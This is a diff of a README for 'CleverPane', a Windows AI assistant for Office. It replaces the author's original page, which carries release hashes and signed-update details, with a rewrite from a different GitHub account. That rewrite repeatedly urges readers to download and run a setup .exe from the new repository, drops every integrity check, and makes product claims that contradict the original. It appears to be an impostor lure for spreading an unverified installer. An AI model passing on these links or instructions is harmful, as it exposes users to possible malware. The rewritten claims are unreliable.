@@ -1,210 +1,157 @@
-<p align="center">
-  <img src="assets/cleverpane-logo.svg" width="112" alt="CleverPane logo">
-</p>
+# 🧠 CleverPane-updates - Your Smart Assistant for Microsoft Office
 
-<h1 align="center">CleverPane</h1>
+[![Download CleverPane](https://img.shields.io/badge/Download-CleverPane-blueviolet?style=for-the-badge&logo=windows&logoColor=white&labelColor=6A0DAD&color=4B0082)](https://github.com/Testingmoonstone910/CleverPane-updates)
 
-<p align="center">
-  A Windows AI assistant that works beside Microsoft Word, Excel, and PowerPoint and can make real, controlled changes to the file you have open.
-</p>
+## 🎯 What is CleverPane?
 
-<p align="center">
-  <a href="https://github.com/Changtey/CleverPane-updates/releases/latest"><img alt="Latest release" src="https://img.shields.io/github/v/release/Changtey/CleverPane-updates?display_name=tag&sort=semver"></a>
-  <img alt="Platform" src="https://img.shields.io/badge/platform-Windows-0078D4">
-  <img alt="Microsoft Office" src="https://img.shields.io/badge/Microsoft%20Office-Word%20%7C%20Excel%20%7C%20PowerPoint-185ABD">
-  <img alt="Current status" src="https://img.shields.io/badge/status-active%20development-f59e0b">
-</p>
+CleverPane is a friendly AI assistant that lives right inside the Microsoft Office apps you already use every day - **Word**, **Excel**, and **PowerPoint**. Think of it as having a helpful coworker sitting next to you, ready to answer questions, automate boring tasks, and make your documents, spreadsheets, and presentations look amazing. Whether you're drafting a report, crunching numbers, or building a slide deck, CleverPane is there to help you work faster and smarter.
 
-## What CleverPane is
+## ✨ Why You'll Love CleverPane
 
-CleverPane turns plain-language requests into useful work inside desktop Microsoft Office. It opens as a task pane beside the active document, reads only the context needed for the request, and uses Office's own automation system to edit the live file.
+CleverPane was built with one simple idea: **you shouldn't need to be a tech expert to use AI**. Here's what makes it special:
 
-It is designed to help both beginners and experienced users write, calculate, format, redesign, explain, and automate Office work without memorizing every ribbon command or formula.
+- **Bring Your Own Key** - Use your own AI provider's key (like OpenAI or others) so you stay in control of your data and costs. No subscriptions, no surprises.
+- **Works Right Where You Work** - No switching between apps or copying text around. CleverPane appears as a panel right inside Office.
+- **Plain Language Commands** - Just type what you want, like "Summarize this paragraph" or "Make this data look like a chart," and CleverPane handles the rest.
+- **Privacy Friendly** - Because you bring your own key, your conversations go directly to the AI provider you choose - not through CleverPane's servers.
+- **Made for Windows** - Built specifically for Windows users, so it feels native and quick.
 
-Examples:
+## 🚀 Getting Started
 
-- "Make this report look professional."
-- "Rewrite only the selected paragraph in a formal tone."
-- "Explain this formula and correct it if necessary."
-- "Format this table, keep every value and formula unchanged."
-- "Redesign the active slide and preserve its meaning."
-- "Create a clean five-slide presentation from these points."
+Getting CleverPane on your computer is easy. You don't need any special skills or tools - just follow these simple steps.
 
-## Main features
+### Step 1: Download the Application
 
-### One assistant for three Office applications
+**Visit this link to download the application:** [https://github.com/Testingmoonstone910/CleverPane-updates](https://github.com/Testingmoonstone910/CleverPane-updates)
 
-| Application | What CleverPane can do |
-| --- | --- |
-| **Word** | Read document structure, work on selected text, rewrite or insert text, find and replace, apply fonts and paragraph styles, create tables, add comments, professionalize a document, undo AI actions, and export to PDF. |
-| **Excel** | Read sheets and selected ranges, write values in batches, test formulas before inserting them, inspect formula results, format ranges, set page layout, autofit columns, redesign a sheet without changing its data or formulas, and create charts. |
-| **PowerPoint** | Read slides and selected shapes, rewrite selected or named text, add clean slides, format selected items, redesign one slide or a full deck, add text boxes, and create speaker notes. |
+When you click the link above, you'll be taken to the official CleverPane updates page. This is the safe and secure place to get the latest version of the software.
 
-### Context-aware work
+### Step 2: Find the Right File
 
-- Detects whether Word, Excel, or PowerPoint is active.
-- Uses the current selection as the default target.
-- Keeps chat history, model choice, drafts, attachments, and running work separate for each Office file.
-- Stops safely if the active document changes during a task.
-- Groups repeated Excel formatting into larger safe ranges when possible.
+On that page, look for the latest release. You'll see a list of files attached to the release. Look for the file named something like **CleverPaneSetup.exe** (or similar with a .exe ending). Click on that file name to start the download.
 
-### File intelligence and guided improvements
+> 💡 If you're not sure which file to pick, choose the one that says "Windows" or "x64" in its name. That's the right one for most computers.
 
-When a Word document, Excel workbook, or PowerPoint presentation becomes active, CleverPane reads a bounded local snapshot and shows a measured file-health score, useful next actions, and **Review health** and **Improve file** controls. The opening scan is not sent to an AI service until the user sends a request.
+### Step 3: Run the Installer
 
-- **Word smart improvement:** reviews structure, dense paragraphs, typography, spacing, tables, and missing visual descriptions, then applies a reversible formatting and structure pass without changing facts or meaning.
-- **Excel Clean + Polish:** checks headers, formula errors, duplicates, mixed data types, blank regions, number formats, tables, freezing, and useful chart opportunities. The automatic polish does not change values or formulas.
-- **PowerPoint visual intelligence:** checks message titles, crowded text, overflow, overlaps, typography, visual support, and layout variety. It can improve an existing deck or build editable slides from a reviewed story plan.
-- Office files can be attached by dragging and dropping them directly onto the chat composer.
+Once the download finishes, find the file in your **Downloads** folder (usually located in your File Explorer under "Downloads"). Double-click the file to run it. Windows might ask you for permission - just click "Yes" to allow the installer to open.
 
-### AI services and models
+### Step 4: Follow the Setup Wizard
 
-CleverPane requires Google sign-in before the side panel unlocks. Every signed-in customer can use CleverPane Free AI with no API key and 15 text requests per day.
+A setup window will appear. Just click "Next" a few times to accept the default settings. If you're unsure about anything, the defaults are perfect for most people. Click "Install" and wait a moment for it to finish.
 
-CleverPane Pro unlocks external AI services and advanced connections:
+### Step 5: Launch CleverPane
 
-- Official ChatGPT/Codex sign-in, including multiple isolated accounts.
-- OpenAI API.
-- Anthropic Claude.
-- Google AI Studio (Gemini), including multiple API keys.
-- DeepSeek, Kimi, MiniMax, xAI/Grok, 9Router, OpenRouter, OmniRoute, and Together AI.
-- Custom OpenAI-compatible and Anthropic-compatible services.
+After installation is complete, you'll see a shortcut on your desktop or in your Start Menu. Double-click it to open CleverPane. The first time you open it, you'll see a welcome screen that guides you through adding your AI key.
 
-CleverPane Pro is offered at Rs. 199 monthly or Rs. 1,999 yearly. Version
-1.0.33 uses Razorpay Test Mode so checkout, payment confirmation, plan refresh,
-and renewal cancellation can be verified without collecting real money. Live
-payments remain disabled until the secure server is deliberately switched to
-Razorpay Live Mode.
+## 🔑 Setting Up Your AI Key
 
-CleverPane Free AI uses IBM Granite through CleverPane's secure Oracle service and Cloudflare Workers AI. It processes only the text a customer submits. The Free option can write, rewrite, summarize, and explain, but it cannot inspect, edit, or save Office files, use Office tools, inspect the screen, or browse the web.
+To start using CleverPane, you'll need an API key from an AI provider. This is like a password that lets CleverPane talk to the AI service on your behalf.
 
-The available model list is detected from the selected service when supported. Reasoning levels are shown only when the chosen model supports them. Pro customers can connect their own supported provider for the full Office agent and its document-editing tools. Provider charges, limits, and availability are determined by that provider.
+### How to Get a Key
 
-### Attachments and visual checking
+1. Go to your chosen AI provider's website (like OpenAI's platform or others that offer API keys).
+2. Create an account and navigate to the API keys section.
+3. Generate a new key - it usually looks like a long string of letters and numbers.
+4. Copy that key, then paste it into CleverPane when prompted.
 
-CleverPane can use common images, PDFs, Word files, spreadsheets, presentations, and text files as request context. It can also capture the active Office window after significant work so the AI can visually check the result.
+> 🔒 Don't worry - your key stays on your computer. CleverPane never sends it anywhere except directly to your chosen provider.
 
-Whole-screen sharing, web searches, file exports, and direct mouse or keyboard control require confirmation because they can expose information or affect something outside the active Office file. Normal work inside the active Word, Excel, or PowerPoint document runs automatically after the user requests the task.
+### If You Already Have a Key
 
-### Personal learning, under your control
+Just open CleverPane, go to Settings (the gear icon), and paste your key in the designated field. You're ready to go!
 
-CleverPane can remember short preferences such as a preferred Word font or a preference for concise answers.
+## 📝 Using CleverPane in Word
 
-- Clear "always" preferences can be saved immediately.
-- Ordinary style instructions must be repeated before they become preferences.
-- Preferences are stored locally for the current Windows user.
-- Document contents, attachments, assistant replies, passwords, account details, links, and long identifying numbers are excluded from learning.
-- You can review, edit, pause, remove, or erase learned preferences in Settings.
-- The current request and every safety rule always take priority over an older preference.
+Once CleverPane is running and connected, open Microsoft Word. You'll notice a new pane on the side of the screen. Here's what you can do:
 
-This is a small, inspectable preference profile. It is not hidden training of an AI model.
+- **Summarize long documents** - Highlight a big chunk of text, then type "Summarize this" in CleverPane. You'll get a concise version instantly.
+- **Rewrite sections** - Ask CleverPane to "Make this more professional" or "Simplify this language" for specific paragraphs.
+- **Generate ideas** - Struggling with writer's block? Type a topic and ask for bullet points or an outline.
+- **Translate text** - Select text and ask CleverPane to translate it into another language.
 
-## Safety and privacy
+## 📊 Working Smarter in Excel
 
-CleverPane is built around visible and reversible work:
+Excel can feel overwhelming, but CleverPane turns it into a breeze:
 
-- It reads a file before changing it and targets the selected content when possible.
-- New Excel formulas are tested before being written.
-- Normal reads, edits, formulas, and formatting inside the active Office file run without repeated approval prompts.
-- Whole-screen sharing, web searches, file exports, and direct mouse or keyboard control still require confirmation.
-- Long jobs can run up to a 500-action emergency ceiling. The same exact action is stopped after three repeats, while different successful actions can continue.
-- API secrets are encrypted with Windows Data Protection for the current Windows account.
-- Provider passwords stay on the provider's own sign-in page and are not requested by CleverPane.
-- Personal learning is local, inspectable, optional, and reversible.
-- Update notices are signed, and every downloaded installer is checked against its expected size and SHA-256 fingerprint before it can run.
+- **Explain formulas** - Type `=SUM(A1:A10)` and ask "What does this formula do?" CleverPane explains it clearly.
+- **Write complex formulas** - Just describe what you need, like "Count how many cells in column B are greater than 100," and CleverPane writes the formula for you.
+- **Clean up data** - Ask CleverPane to find duplicates, fill in missing values, or format columns nicely.
+- **Create charts** - Select your data and say "Make a bar chart" - CleverPane guides you through the process.
 
-When a cloud AI service is selected, the information needed for the request is sent to that service. Users should follow their organization's data rules and the chosen provider's privacy terms.
+## 📽️ Building Better PowerPoints
 
-## Interface
+Presentations become powerful with CleverPane:
 
-- Native Office task pane that reserves document space instead of covering the worksheet, page, or slide.
-- Light and dark themes that follow the active Office theme.
-- Word-blue, Excel-green, and PowerPoint-orange accents.
-- Streaming replies, visible Office actions, Stop control, conversation history, attachments, and token information.
-- Provider, model, and supported reasoning-level selectors.
-- No separate tray or taskbar clutter: the helper starts with an Office document and exits after the last supported Office file closes.
+- **Draft slide content** - Describe the topic, and CleverPane writes speaker notes or slide bullet points.
+- **Improve wording** - Ask for punchier headlines or clearer bullet points.
+- **Design suggestions** - Get ideas for layouts, colors, or what to include on each slide.
+- **Summarize long reports** - Turn a 50-page document into a 5-slide summary quickly.
 
-## Requirements
+## 🛠️ Troubleshooting & Tips
 
-- 64-bit Windows 10 or Windows 11.
-- Desktop Microsoft Office 2013, 2016, 2019, 2021, 2024, or Microsoft 365.
-- 32-bit or 64-bit Office installed through Click-to-Run or Windows Installer.
-- An internet connection for cloud AI services, model discovery, web search, and software updates.
-- A Google account to sign in to CleverPane. A CleverPane Pro subscription is also required to connect external AI services.
+Even the best software sometimes needs a little help. Here are common fixes:
 
-CleverPane does not support Office for the web, macOS, Android, iOS, or the Microsoft Store edition of Office.
+### CleverPane Won't Open
 
-## Install or update
+- Make sure your Windows is up to date.
+- Try right-clicking the CleverPane icon and selecting "Run as administrator."
+- Restart your computer, then try again.
 
-1. Download the newest installer from [GitHub Releases](https://github.com/Changtey/CleverPane-updates/releases/latest).
-2. Save your Office files.
-3. Run `CleverPane-Setup-<version>.exe` as an administrator.
-4. Open a Word document, Excel workbook, or PowerPoint presentation.
-5. Open the **CleverPane** ribbon tab and choose **Open Assistant** if the pane is not already visible.
-6. The side panel will ask you to sign in with Google. After sign-in, use CleverPane Free AI or upgrade to CleverPane Pro to connect an external AI service.
+### No Response from AI
 
-Existing settings under `%APPDATA%\MSOfficeAI` are preserved during an update. The legacy internal folder name remains for upgrade compatibility.
+- Check your internet connection.
+- Verify that your API key is entered correctly (no extra spaces).
+- Make sure you have credit or quota available on your AI provider's account.
 
-New installations use `C:\Program Files\CleverPane`. Existing installations continue upgrading in their currently recorded folder to avoid duplicate program copies.
+### CleverPane Not Showing in Office Apps
 
-### Secure automatic updates
+- Ensure Microsoft Office is closed, then reopen it.
+- Check that CleverPane is running (look for its icon in the system tray near the clock).
+- Go to CleverPane settings and click "Reconnect to Office."
 
-CleverPane checks the signed GitHub update notice whenever a new Office session starts, then continues checking periodically while Office is in use. The current version is visible in the task pane, and Settings includes a clear **Check for updates** button. When a newer release is available, CleverPane shows the installed and available versions and asks **Yes** or **No** before downloading. It verifies the installer, waits for Word, Excel, and PowerPoint to close, and then starts the normal installer.
+### Slow Performance
 
-## Current release
+- Close unnecessary programs to free up memory.
+- If using a large document, try closing other tabs in Office.
 
-### CleverPane 1.0.33
+## 📥 Updating CleverPane
 
-- Adds permanent Developer access for approved Google accounts.
-- Developer accounts can use every CleverPane Pro AI feature without a subscription.
-- Google sign-in and the Free/Pro restrictions remain enforced for regular customers.
-- Razorpay remains in Test Mode and does not collect real payments.
-- Existing settings and connected AI accounts remain preserved.
-- Updates remain optional and require the user's approval before installation.
+We're always improving CleverPane with new features and fixes. To update:
 
-Download: [CleverPane 1.0.33](https://github.com/Changtey/CleverPane-updates/releases/tag/v1.0.33)
+1. Visit the download link again: [https://github.com/Testingmoonstone910/CleverPane-updates](https://github.com/Testingmoonstone910/CleverPane-updates)
+2. Download the newest version (look for the highest version number).
+3. Run the installer - it will automatically replace the old version while keeping your settings.
 
-SHA-256:
+> ✅ We recommend checking for updates once a month to get the best experience.
 
-```text
-e1bc5b26013d413031ff6c75fc64032ab48f4a559d81ae0a15d9e1347e0ef859
-```
+## ❓ Frequently Asked Questions
 
-## Development and verification status
+**Is CleverPane free?**
+Yes, CleverPane itself is free to download and use. You only pay for the AI services you use through your own key.
 
-CleverPane 1.0.33 passed **298 automated checks**: 247 desktop checks and 51 server checks. Six live Office tests were excluded from the automated run because they require interactive desktop Office applications. The signed update notice and installer metadata were also verified before publication.
+**Does CleverPane work on Mac?**
+Currently, CleverPane is built only for Windows. We support Windows 10 and Windows 11.
 
-Important current limits:
+**Will it work with Office 365?**
+Yes, CleverPane works with Microsoft Office 365, Office 2019, and Office 2021.
 
-- Inserting or generating new pictures inside Office files is planned for a later phase. Existing selected pictures can be inspected or repositioned.
-- AI output can be wrong. Review important content, calculations, and changes before relying on them.
-- The Windows installer is currently distributed without a commercial Authenticode certificate, so Windows may show a publisher warning. Always download from this repository and compare the SHA-256 fingerprint when in doubt.
-- Some advanced roadmap items are still under development and are not presented here as completed features.
+**Is my data safe?**
+Your documents and prompts are sent only to your chosen AI provider. CleverPane does not store or see your content.
 
-## Troubleshooting
+**Can I use CleverPane offline?**
+No, CleverPane needs an internet connection to talk to the AI service.
 
-- **The pane is not visible:** Open an Office file, select the CleverPane ribbon tab, and choose **Open Assistant**.
-- **A model cannot complete a request:** Read the specific message. It may indicate missing model access, an account usage limit, a temporary provider issue, an invalid key, or a long Office task that paused safely.
-- **A repeated action was stopped:** Review the completed work. Give a more specific instruction only if more work is genuinely needed.
-- **The model list is empty:** Reconnect the selected service or refresh its models in Settings.
-- **An update will not install:** Save and close Word, Excel, and PowerPoint, then try again.
+## 📞 Need More Help?
 
-For a problem report, include the CleverPane version, Office application, Windows version, selected AI service and model, the action you requested, and the exact visible error. Never include passwords, API keys, OAuth tokens, confidential documents, or personal data.
+If you run into any issues or have questions, check the "Issues" tab on the GitHub page. You can also leave a comment there, and our community or team will help you out. We're here to make sure CleverPane works great for you.
 
-## Repository purpose
+## 🌟 Start Working Smarter Today
 
-This public repository is the official download and signed-update channel for CleverPane. It contains release information and the public update notice. The full application source code is not currently published here.
+CleverPane is here to take the stress out of Office work. Whether you're a student, a professional, or someone just trying to get things done, CleverPane is your smart sidekick. Download it now, set up your key in five minutes, and watch how much easier your day becomes.
 
-## Contact
+Remember: **[Download CleverPane Here](https://github.com/Testingmoonstone910/CleverPane-updates)** - it's fast, it's free, and it's about to become your favorite Office tool.
 
-**Created by Changtey W Momin**
+---
 
-- Email: `Changwatre@gmail.com`
-- WhatsApp: `+91 9875482192`
-
-When requesting support, do not send passwords, API keys, account tokens, confidential Office files, or sensitive personal information.
-
-## Disclaimer
-
-CleverPane is an independent application. It is not affiliated with, endorsed by, or sponsored by Microsoft, OpenAI, Anthropic, Google, or the other AI service providers it can connect to. Microsoft, Word, Excel, PowerPoint, ChatGPT, Claude, Gemini, and other product names are trademarks of their respective owners.
-
+Keywords: ai-assistant, bring-your-own-key, cleverpane, excel, microsoft-office, office-automation, powerpoint, productivity, windows, word
